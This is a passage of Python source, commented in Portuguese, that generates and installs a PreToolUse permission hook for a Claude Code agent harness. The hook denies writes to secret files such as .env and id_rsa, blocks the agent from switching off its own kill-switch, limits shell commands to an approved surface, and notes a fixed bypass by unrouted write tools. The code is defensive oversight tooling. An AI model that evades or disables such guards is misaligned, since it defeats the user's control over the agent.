            "planejado - bloqueio incondicional, independente de contrato ativo"
        )

    if is_floor_powershell_secret_write(command):
        return "deny", (
            "runtime floor: escrita em arquivo de segredo via PowerShell "
            "(.env/.pem/id_rsa/credentials) e bloqueio incondicional, "
            "independente de contrato ativo"
        )

    if is_floor_disable_command(command) or is_floor_bash_disable_redirect(command):
        return "deny", (
            "runtime floor: `harness disable` / criar o sentinel de kill-switch "
            "(.harness/harness.disabled) via PowerShell e bloqueio incondicional - o "
            "agente nao pode se auto-desativar; rode no SEU terminal (fora do Claude Code)"
        )

    protected_problem = _protected_branch_commit_problem(command, cwd)
    if protected_problem:
        return "deny", protected_problem

    # Mesmo modo bootstrap do _evaluate_bash (extraido em _bootstrap_or_completed,
    # item 11 do laudo, T-04/onda-3): sem contrato, superficie minima de
    # COMANDO em vez de deny total. Escrita continua fechada - o branch de
    # write target abaixo delega a _evaluate_file, que nega sem contrato.
    bootstrap, feature_list, completed = _bootstrap_or_completed(cwd)
    if completed is not None:
        return completed

    target = _extract_powershell_write_target(command)
    if target is not None:
        path = _resolve_path(target, cwd)
        return _evaluate_file(path, cwd)

    allowed_sequences = _build_allowed_sequences(cwd, bootstrap, feature_list)

    # Item 7: mesma estrutura de escapes do _evaluate_bash - cada segmento
    # passa se (1) prefixa alguma allowed_sequence, (2) e cmdlet read-only de
    # pipeline, (3) e utilitario read-only, ou (4) e `cd` intra-repo. Sem
    # isto, `pytest -q | Select-Object -First 5` era deny e o caminho
    # PowerShell ficava inutilizavel sob contrato ativo.
    segments = _split_shell_segments(command)
    failing = None
    for seg in segments:
        if _segment_prefixes_any(_tokenize_command(seg), allowed_sequences):
            continue
        if _is_readonly_ps_cmdlet_segment(seg):
            continue
        if _is_readonly_shell_segment(seg):
            continue
        if _is_safe_cd_segment(seg, cwd):
            continue
        failing = seg
        break
    if segments and failing is None:
        return "allow", (
            "comando declarado na superficie compilada do contrato "
            "(verify_cmd/lint/typecheck/build/install/git local), cmdlet "
            "read-only de pipeline, utilitario read-only ou cd intra-repo - PowerShell"
        )
    if failing is not None:
        if bootstrap:
            return "deny", _no_contract_command_deny(failing, cwd)
        return "deny", (
            "segmento '" + failing[:80] + "' fora da superficie compilada do "
            "contrato (PowerShell) e nao aceito como cmdlet read-only - nem de "
            "pipeline (Select-Object/Where-Object/Measure-Object/Sort-Object/"
            "Format-Table/Format-List/Out-String) nem de leitura (Get-Content/"
            "Get-ChildItem/Select-String/Write-Output/Get-Location/Get-Item/"
            "Test-Path e seus aliases); ForEach-Object NAO entra - executa "
            "scriptblock arbitrario. Tambem nao passou como utilitario "
            "read-only nem cd "
            "intra-repo. Atribuicao a $env:* tambem nao entra: para invocar um "
            "binario do venv, use a forma `.venv/Scripts/<bin>` direto, que o "
            "guard reconhece como equivalente ao declarado. "
            + command_escape_hint(failing, cwd)
        )
    if bootstrap:
        return "deny", _no_contract_command_deny(command, cwd)
    return "deny", (
        "comando fora da superficie compilada do contrato (PowerShell). "
        + command_escape_hint(command, cwd)
    )


# Tools read-only/utilitarias CONHECIDAS que passam sem analise de escrita
# (Item 1 do backlog de correcao do issue #1). Task e usado pelo proprio
# harness (subagentes) e NAO pode cair no branch de tool desconhecida.
# TaskCreate/TaskGet/TaskList/TaskOutput/TaskStop/TaskUpdate (item 17 do
# laudo, T-02/onda-3): ferramentas nativas de acompanhamento de tarefa do
# proprio Claude Code, read-only-adjacentes (nao escrevem no repositorio-alvo)
# -- sem isto, "TaskCreate" cai no ramo de tool desconhecida e e negada so por
# conter "create" no nome (ja aconteceu numa sessao real deste projeto).
_READONLY_ALLOWLIST_TOOLS = (
    "Read", "Glob", "Grep", "Task", "WebFetch", "TodoWrite",
    "TaskCreate", "TaskGet", "TaskList", "TaskOutput", "TaskStop", "TaskUpdate",
)

# Tool NAO enumerada acima: politica MINIMA pra deploy single-user interno -
# nome com cara de escrita (contem write/create/edit, case-insensitive,
# cobre mcp__*__write*) nega por padrao; resto e allow LOGADO (risco
# residual assumido, documentado no docstring do modulo importavel).
_UNKNOWN_WRITE_NAME_PATTERN = re.compile(r"(?i)(write|create|edit)")


def main() -> None:
    try:
        import os

        # Kill-switch: se o usuario desativou o harness (sentinel
        # .harness/harness.disabled presente), este hook faz no-op -> allow.
        # Precede TUDO, inclusive o floor: uma vez desativado pelo usuario (que
        # rodou `harness disable` no terminal proprio, sem hook), o boundary_guard
        # nao gateia mais nada ate `harness enable`. O floor anti-auto-desativacao
        # abaixo (_evaluate_*) so roda enquanto ATIVO, negando o agente criar o
        # sentinel - sem paradoxo.
        if _harness_disabled():
            print(json.dumps({
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": "allow",
                    "permissionDecisionReason": (
                        "harness desativado pelo usuario (.harness/harness.disabled) - "
                        "kill-switch externo ativo, boundary_guard em no-op ate `harness enable`"
                    ),
                }
            }))
            return

        data = json.load(sys.stdin)
        tool_name = data.get("tool_name") or ""
        tool_input = data.get("tool_input") or {}
        cwd = data.get("cwd") or ""
        # cwd ORIGINAL do payload, antes da troca pela ancora abaixo - e ele
        # que diz onde um file_path RELATIVO esta enraizado (ver
        # _absolutize_against_payload_cwd mais abaixo, Ressalva 3b).
        cwd_payload = cwd

        # Item 6 do backlog de correcao do issue #1 (deriva de cwd): se
        # compile-session gravou repo_root em compiled-state-session.json,
        # ancora o cwd EFETIVO usado por TODO o resto de main() (_resolve_path,
        # _load_json via _evaluate_file/_evaluate_bash/_evaluate_powershell, e
        # _evaluate_feature_list_edit) na raiz real do repo, em vez do cwd do
        # payload - que pode ter derivado (ex.: agente rodou cd frontend/ sem
        # voltar). __file__ e o proprio script instalado, que sempre mora em
        # <repo_root>/.harness/hooks/boundary_guard.py - subir a partir dali
        # sempre alcanca a raiz real, mesmo com cwd do payload derivado.
        # Fallback obrigatorio: sem state, sem a chave, JSON invalido, ou
        # diretorio que nao existe mais -> None, cwd do payload intocado
        # (comportamento atual, repos sem compile-session recente nao quebram).
        repo_root_anchor = _resolve_repo_root_anchor(__file__)
        if repo_root_anchor:
            cwd = repo_root_anchor

        def _absolutize_against_payload_cwd(raw_path):
            """Ressalva 3b (validacao Opus pos-implementacao do Item 6): a
            troca incondicional de cwd pela ancora acima resolve certo pra
            file_path ABSOLUTO (o caso comum - as tools de escrita do Claude
            Code mandam path absoluto), mas quebraria um file_path RELATIVO a
            um cwd derivado (ex.: shell preso em <repo>/frontend, tool manda
            'x.ts' querendo 'frontend/x.ts'): avaliar 'x.ts' bruto contra a
            raiz ancorada ('<repo>') daria falso-deny (fail-safe, nunca abre
            um bypass, mas e exatamente a classe de falso-deny que o Item 6
            quer eliminar). Fix: se raw_path for relativo, absolutiza-o
            contra cwd_payload (o cwd ORIGINAL do payload, capturado ANTES da
            troca pela ancora acima - e ele que diz onde um path relativo
            esta enraizado) antes de qualquer strip de prefixo pela ancora.
            Path absoluto passa inalterado. Zero subprocess - so os.path
            (stdlib), nenhuma logica de parsing nova."""
            if not raw_path or os.path.isabs(raw_path):
                return raw_path
            if not cwd_payload:
                return raw_path
            return os.path.normpath(os.path.join(cwd_payload, raw_path))

        if tool_name in ("Edit", "Write"):
            path = _resolve_path(
                _absolutize_against_payload_cwd(tool_input.get("file_path") or ""), cwd
            )
            special = None
            if path == FEATURE_LIST_PATH:
                special = _evaluate_feature_list_edit(tool_name, tool_input, cwd)
            if special is not None:
                decision, reason = special
            else:
                decision, reason = _evaluate_file(path, cwd)
        elif tool_name == "MultiEdit":
            # MultiEdit e uma tool de escrita REAL do Claude Code (multiplas
            # edicoes old_string/new_string sobre um UNICO arquivo,
            # tool_input.file_path). Antes desta correcao (achado adversarial
            # pos-implementacao, validacao Opus) MultiEdit nao estava
            # roteada aqui e caia no ramo de tool desconhecida - o nome
            # contem "edit", entao era deny SEMPRE, mesmo dentro da
            # superficie aprovada (fail-safe, mas quebrava fluxo legitimo).
            # NAO tenta o caso especial de feature-lock (_evaluate_feature_list_edit
            # espera o formato de tool_input do Edit/Write simples, nao o
            # array `edits[]` do MultiEdit) - uma MultiEdit sobre
            # feature_list.json cai na superficie generica (hoje ja resulta
            # em deny, mesmo comportamento seguro-por-padrao documentado
            # para Edit/Write quando nao ha transicao para passes:true).
            path = _resolve_path(
                _absolutize_against_payload_cwd(tool_input.get("file_path") or ""), cwd
            )
            decision, reason = _evaluate_file(path, cwd)
        elif tool_name == "NotebookEdit":
            # tool_input do NotebookEdit documentado (tools-reference do
            # Claude Code) usa o formato de path do Edit/Write; o campo
            # exato nao foi exposto pela doc publica consultada, entao
            # tentamos notebook_path (assumido) com fallback pra file_path -
            # qualquer um dos dois ainda passa pela MESMA avaliacao de
            # superficie/floor de _evaluate_file, sem enfraquecer nada.
            raw_path = tool_input.get("notebook_path") or tool_input.get("file_path") or ""
            path = _resolve_path(_absolutize_against_payload_cwd(raw_path), cwd)
            decision, reason = _evaluate_file(path, cwd)
        elif tool_name == "PowerShell":
            command = tool_input.get("command") or ""
            decision, reason = _evaluate_powershell(command, cwd)
        elif tool_name == "Bash":
            command = tool_input.get("command") or ""
            decision, reason = _evaluate_bash(command, cwd)
        elif tool_name in _READONLY_ALLOWLIST_TOOLS:
            decision, reason = "allow", (
                "ferramenta read-only/utilitaria conhecida, fora do escopo de "
                "escrita do boundary_guard"
            )
            # AVISO, nao bloqueio: o floor de segredo e de ESCRITA (decisao
            # explicita de projeto). Ler .env costuma ser legitimo
            # (.env.example, conferir uma chave de config), mas o conteudo
            # entra no contexto do agente - entao a leitura fica registrada
            # na razao em vez de passar muda.
            raw_path = tool_input.get("file_path") or tool_input.get("path") or ""
            if raw_path and is_floor_secret_path(_resolve_path(raw_path, cwd)):
                reason += (
                    " | AVISO: o alvo tem nome de arquivo de segredo "
                    "(.env/.pem/id_rsa/credentials) - leitura NAO e bloqueada "
                    "pelo floor (que e de escrita), mas o conteudo entra no "
                    "contexto da sessao"
                )
        else:
            if _UNKNOWN_WRITE_NAME_PATTERN.search(tool_name):
                decision, reason = "deny", (
                    "tool desconhecida com nome de escrita (contem write/create/edit) - "
                    "boundary_guard nega por padrao ate ser roteada explicitamente; se "
                    "for uma tool read-only legitima, adicione-a a allowlist conhecida"
                )
            else:
                decision, reason = "allow", (
                    "tool desconhecida fora do padrao de nome de escrita conhecido - "
                    "allow-logado (politica minima de deploy single-user interno; "
                    "risco residual assumido, ver docstring de harness.boundary_guard)"
                )
    except Exception as exc:
        decision, reason = "deny", (
            "boundary_guard: erro interno ao avaliar a tool call (" + repr(exc) + ") - "
            "fail-closed por seguranca; corrija o payload/ambiente e tente de novo"
        )

    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": decision,
            "permissionDecisionReason": reason,
        }
    }))


if __name__ == "__main__":
    main()
''')

    return header + shared_block + middle


# ---------------------------------------------------------------------------
# Apply (escreve no projeto-alvo) — sem importar compiler.py
# ---------------------------------------------------------------------------

def _load_json_state(path: Path) -> dict[str, Any]:
    if not path.is_file():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return {}


def install_boundary_guard(target_dir: Path) -> Path:
    """Instala `boundary_guard.py` como o único hook `PreToolUse` em
    `target_dir`, cobrindo TODA tool call (matcher `"*"`, não mais
    `"Edit|Write|Bash"` — ver docstring do módulo, seção "Matcher do hook e
    roteamento explícito", para a correção do bypass de tool de escrita e a
    confirmação via doc oficial do Claude Code de que `"*"` casa qualquer
    tool em `PreToolUse`). O roteamento por-tool (Edit/Write/NotebookEdit/
    PowerShell/Bash tratadas explicitamente; allowlist read-only fixa;
    política mínima por-nome para o resto) acontece dentro de `main()` do
    script gerado, não no matcher.

    Escreve `target_dir/.harness/hooks/boundary_guard.py` e registra o hook
    em `target_dir/.claude/settings.local.json` (matcher `"*"`, constante
    `BOUNDARY_HOOK_MATCHER`; o destino é machine-local porque o comando leva
    path absoluto — ver `harness.settings_paths`). Merge não-destrutivo via
    `target_dir/.harness/compiled-state-session.json`
    (chave própria `boundary_guard_hook_command`, preservando outras chaves
    já presentes — o arquivo é compartilhado com hooks irmãos de sessão).
    Também grava, sob `REPO_ROOT_STATE_KEY` (`"repo_root"`), a raiz absoluta
    de `target_dir` — Item 6 do backlog de correção do issue #1 (deriva de
    `cwd`): o hook standalone lê essa chave em runtime (`_resolve_repo_root_anchor`)
    para ancorar a resolução de path/contrato na raiz real do repo, em vez do
    `cwd` reportado pela tool call, que pode ter derivado.

    Também remove, de `hooks.PreToolUse` do arquivo gerenciado, qualquer
    entrada legada cujo `command` referencie o `guard_tests.py` gerado pelo
    `compiler.py` (mecanismo antigo, v0.10.0) OU o `guard_test_runner.py`
    (aposentado em T-01/onda-3): o `boundary_guard.py` já cobre a proteção de
    teste (por tarefa do contrato) e todo `Bash`, e manter qualquer um dos
    dois ativo faria um segundo processo rodar por tool call sem mudar
    nenhuma decisão (o antigo `guard_tests.py` ainda disparava `ask`,
    auto-negado em modo headless, para o mesmo Edit que este já libera por
    `allow`). Nenhuma outra entrada de `hooks.PreToolUse` é tocada.
    """
    target_dir = target_dir.resolve()

    hooks_dir = target_dir / HOOKS_DIR
    hooks_dir.mkdir(parents=True, exist_ok=True)
    script_path = hooks_dir / BOUNDARY_HOOK_FILENAME
    protected_branches = load_protected_branches(target_dir)
    content = render_boundary_guard(protected_branches)
    script_path.write_text(content, encoding="utf-8")
    # T-03/onda-3 (item 10 restante do laudo): hash do conteúdo gravado, para
    # o hook `SessionStart` (stdlib-only, não pode chamar `render_boundary_guard`
    # — este depende de `HarnessConfig`/pydantic/yaml via `load_protected_branches`)
    # detectar, sem re-renderizar nada, se o arquivo instalado foi editado à
    # mão desde então. `harness audit` continua sendo a checagem completa
    # (recompila e compara o conteúdo inteiro); isto é só um sinal barato na
    # sessão seguinte, mesmo canal que já avisa sobre kill-switch desligado.
    # Hash calculado a partir do que `write_text` de fato gravou (não do
    # `content` em memória): `write_text` traduz `\n` -> `\r\n` no Windows —
    # hashear a string em memória divergiria do arquivo real a cada sessão.
    content_hash = hashlib.sha256(script_path.read_bytes()).hexdigest()

    # Item 1 do backlog do dogfood venv-Windows: interpretador ABSOLUTO
    # bakeado (nao `python` nu resolvido pelo PATH de runtime) — ver
    # `harness.hook_launcher` para o porque e o risco residual.
    command = hook_command(script_path)

    # Destino machine-local + `.gitignore` tool-owned (`.harness/` e
    # `.claude/`) + a superfície de scratch (Garantia 4), tudo pelo ponto
    # único de `settings_paths`. `.harness/` NÃO é
    # versionado por inteiro: `work/`, `feature_list.json` e `evidence/` viajam
    # pra branch, mas `hooks/`, `compiled-state*.json` e o sentinel do
    # kill-switch carregam path absoluto/estado de sessão desta máquina — por
    # isso o ignore é explícito por entrada. Ver `harness.settings_paths` para
    # a política e o critério de decisão.
    settings_path, settings = prepare_managed_settings(target_dir)

    state_path = target_dir / SESSION_STATE_FILE
    state: dict[str, Any] = _load_json_state(state_path)
    old_command = state.get(BOUNDARY_STATE_KEY)

    hooks = settings.setdefault("hooks", {})
    pre = hooks.get("PreToolUse", [])

    def _is_old_managed(entry: dict[str, Any]) -> bool:
        return old_command is not None and any(
            h.get("command") == old_command for h in entry.get("hooks", [])
        )

    def _is_legacy_guard_tests(entry: dict[str, Any]) -> bool:
        return any(
            LEGACY_GUARD_TESTS_MARKER in (h.get("command") or "")
            for h in entry.get("hooks", [])
        )

    def _is_legacy_guard_test_runner(entry: dict[str, Any]) -> bool:
        return any(
            LEGACY_GUARD_TEST_RUNNER_MARKER in (h.get("command") or "")
            for h in entry.get("hooks", [])
        )

    def _references_our_script(entry: dict[str, Any]) -> bool:
        """Entrada que aponta para o NOSSO script, independente da forma do
        comando. Necessário desde que o formato do `command` mudou (`python
        "<script>"` -> `"<interp absoluto>" "<script>"`, Item 1 do backlog do
        dogfood venv-Windows): sem isto, um `settings.json` cuja entrada
        antiga não conste do `compiled-state-session.json` (state apagado,
        repo clonado com o settings versionado) sobreviveria ao merge e o
        guard rodaria DUAS vezes por tool call. Casa por nome de arquivo, o
        mesmo critério já usado por `_is_legacy_guard_tests` acima."""
        return any(
            BOUNDARY_HOOK_FILENAME in (h.get("command") or "")
            for h in entry.get("hooks", [])
        )

    kept_entries = [
        e for e in pre
        if not _is_old_managed(e)
        and not _is_legacy_guard_tests(e)
        and not _is_legacy_guard_test_runner(e)
        and not _references_our_script(e)
    ]
    new_entry = {
        "matcher": BOUNDARY_HOOK_MATCHER,
        "hooks": [{"type": "command", "command": command}],
    }
    hooks["PreToolUse"] = kept_entries + [new_entry]

    write_managed_settings(settings_path, settings)

    state[BOUNDARY_STATE_KEY] = command
    state[BOUNDARY_CONTENT_HASH_STATE_KEY] = content_hash
    # Item 6 do backlog de correção do issue #1 (deriva de cwd): grava a raiz
    # absoluta do projeto-alvo UMA vez, sob REPO_ROOT_STATE_KEY, preservando
    # (merge não-destrutivo, igual acima) quaisquer outras chaves já
    # presentes. O hook standalone gerado lê esta chave em runtime via
    # `_resolve_repo_root_anchor` para ancorar `_resolve_path`/`_load_json`
    # em vez do `cwd` reportado pela tool call — ver docstring do módulo,
    # seção "Raiz do repo fixada".
    state[REPO_ROOT_STATE_KEY] = str(target_dir)
    state_path.parent.mkdir(parents=True, exist_ok=True)
    state_path.write_text(
        json.dumps(state, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )

    return script_path
